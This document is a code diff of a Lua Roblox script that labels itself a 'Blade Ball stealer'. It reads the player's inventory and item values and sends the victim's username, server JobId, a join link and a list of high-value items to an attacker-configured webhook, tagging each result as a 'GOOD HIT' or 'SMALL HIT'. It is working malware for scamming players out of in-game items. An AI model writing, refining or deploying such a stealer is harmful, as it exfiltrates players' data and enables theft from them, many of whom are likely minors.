@@ -1,19 +1,12 @@
+-- // SECURITE EXECUTION
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
-
--- // AUTHENTICATION
-local auth_token = "EBK-SS-A" 
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
--- // CONFIGURATION RÉCUPÉRÉE
-local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
 
 -- // FONCTION D'ENVOI POUR TON WORKER
 local function sendToWorker(payload)
@@ -21,16 +14,16 @@ local function sendToWorker(payload)
     if requestFunc then
         pcall(function()
             requestFunc({
-                Url = webhook,
+                Url = _G.webhook, 
                 Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
+                Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(payload)
             })
         end)
     end
 end
 
--- // FORMATAGE
+-- // FORMATAGE RAP (2.11k, etc.)
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -39,71 +32,89 @@ local function formatNumber(number)
         number = number / 1000
         suffixIndex = suffixIndex + 1
     end
-    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        return string.format("%.2f%s", number, suffixes[suffixIndex])
+    end
 end
 
--- // RÉCUPÉRATION INVENTAIRE & RAP
-local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(ReplicatedStorage.Packages.Replion)
-local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
-local categories = {"Sword", "Emote", "Explosion"}
-
+-- // SCAN ET GROUPAGE DE L'INVENTAIRE
 local itemsFound = {}
 local totalRAP = 0
 
-for _, cat in ipairs(categories) do
-    if clientInventory[cat] then
-        for _, itemInfo in pairs(clientInventory[cat]) do
-            local rap = 0
-            if rapData[cat] then
-                for key, value in pairs(rapData[cat]) do
-                    if string.find(key, itemInfo.Name) then
-                        rap = value
-                        break
+local success, err = pcall(function()
+    local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
+    local Replion = require(ReplicatedStorage.Packages.Replion)
+    local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
+    local categories = {"Sword", "Emote", "Explosion"}
+
+    for _, cat in ipairs(categories) do
+        if clientInventory[cat] then
+            for id, info in pairs(clientInventory[cat]) do
+                local rap = 0
+                if rapData[cat] then
+                    for key, value in pairs(rapData[cat]) do
+                        if string.find(key, info.Name) then
+                            rap = value
+                            break
+                        end
                     end
                 end
-            end
-            
-            if rap >= min_rap then
-                totalRAP = totalRAP + rap
-                table.insert(itemsFound, {Name = itemInfo.Name, RAP = rap})
+                
+                if rap >= (_G.min_rap or 50) then
+                    totalRAP = totalRAP + rap
+                    table.insert(itemsFound, {Name = info.Name, RAP = rap})
+                end
             end
         end
     end
-end
+end)
 
--- // PRÉPARATION DE L'EMBED (TON FORMAT)
+-- // PREPARATION DU PAYLOAD
 if #itemsFound > 0 or totalRAP > 0 then
-    table.sort(itemsFound, function(a, b) return a.RAP > b.RAP end)
+    -- Groupage (x1, x2...)
+    local grouped = {}
+    for _, item in ipairs(itemsFound) do
+        if grouped[item.Name] then
+            grouped[item.Name].Count = grouped[item.Name].Count + 1
+            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+        else
+            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
+        end
+    end
+
+    local groupedList = {}
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return b.TotalRAP > a.TotalRAP end)
+
+    local itemListText = ""
+    for _, group in ipairs(groupedList) do
+        itemListText = itemListText .. string.format("%s (x%d) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
+    end
 
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
-    local webhookName = isGoodHit and "🟢 Eblack - LOGGER" or "🟣 Eblack - LOGGER"
+    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
     local embedColor = isGoodHit and 65280 or 8323327
 
-    local itemListText = ""
-    for i, item in ipairs(itemsFound) do
-        if i <= 25 then -- Limite pour l'affichage Discord
-            itemListText = itemListText .. string.format("%s - **%s RAP**\n", item.Name, formatNumber(item.RAP))
-        end
-    end
-
-    local payload = {
-        ["auth_token"] = auth_token,
+    local workerPayload = {
+        ["auth_token"] = "EBK-SS-A",
         ["username"] = webhookName,
-        ["content"] = (ping == "Yes" and "@everyone " or "") .. "New Inventory Logged!",
+        ["content"] = (_G.pingEveryone == "Yes" and "--[[@everyone]]\n" or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = embedTitle,
             ["color"] = embedColor,
             ["fields"] = {
-                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = true},
-                {name = "Item list 📝:", value = itemListText ~= "" and itemListText or "No high RAP items found.", inline = false},
-                {name = "Join link 🔗:", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```", inline = false}
+                {["name"] = "Victim Username 🤖:", ["value"] = plr.Name, ["inline"] = true},
+                {["name"] = "JobId 🆔:", ["value"] = "```" .. game.JobId .. "```", ["inline"] = true},
+                {["name"] = "Join link 🔗:", ["value"] = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, ["inline"] = false},
+                {["name"] = "Item list 📝:", ["value"] = itemListText ~= "" and itemListText or "None", ["inline"] = false},
+                {["name"] = "Summary 💰:", ["value"] = "Total RAP: **" .. formatNumber(totalRAP) .. "**", ["inline"] = false}
             },
-            ["footer"] = {["text"] = "Blade Ball Inventory Logger by Eblack"}
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
 
-    sendToWorker(payload)
+    sendToWorker(workerPayload)
 end
